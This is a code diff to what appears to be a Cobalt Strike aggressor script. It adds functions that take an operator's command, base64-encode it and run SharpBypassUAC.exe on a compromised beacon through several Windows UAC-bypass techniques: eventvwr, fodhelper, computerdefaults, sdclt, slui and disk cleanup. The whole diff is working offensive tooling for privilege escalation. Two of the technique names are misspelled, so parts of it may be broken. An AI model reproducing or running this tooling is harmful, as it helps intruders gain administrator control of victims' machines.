@@ -521,20 +521,51 @@ bexecute_assembly($1, script_resource('/exe/SweetPotato.exe'));
 
 #################################################
 
-#################################################
-
-#   SharpBypassUAC
-
-#################################################
+sub eventvwr_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b eventvwr -e $b64"); 
+}
 
 sub fodhelper_bypass{ 
 prompt_text("Enter A Command:", "", lambda({ 
 $b64 = base64_encode("$1")
 }))
-bexecute_assembly($1, script_resource('exe/SharpBypassUAC.exe'),"-b fodhelper -e $b64"); 
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b fodhelper -e $b64"); 
 }
 
-#Please Add UAC Bypass Functions - https://github.com/FatRodzianko/SharpBypassUAC
+sub computerdefaults_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b computerdefaults -e $b64"); 
+}
+
+sub sdclt_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b sdlct -e $b64"); 
+}
+
+sub slui_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b slui -e $b64"); 
+}
+
+sub diskCleanup_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b dikcleanup -e $b64"); 
+}
+
+
+
+
 
 
 
